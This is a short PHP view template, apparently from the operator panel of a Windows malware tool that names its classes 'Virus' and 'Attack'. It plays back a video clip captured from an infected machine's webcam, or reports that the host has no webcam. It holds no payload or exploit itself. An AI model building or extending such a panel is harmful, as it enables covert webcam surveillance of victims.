<?php
/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\Webcam\Webcam $attack */

if ($attack->hasWebcam()) { ?>
    <br><br>
    <video controls>
        <source src="<?php echo DOMAIN . "/vrs/" . $attack->getVirusId() . "/aks/" . $attack->getAttackId() . "/ctrls/getFile?file=clip.mp4"; ?>"
                type="video/mp4">
        Your browser does not support the video tag.
    </video>
<?php } else { ?>
    <p>The host computer doesn't have a webcam</p>
<?php }
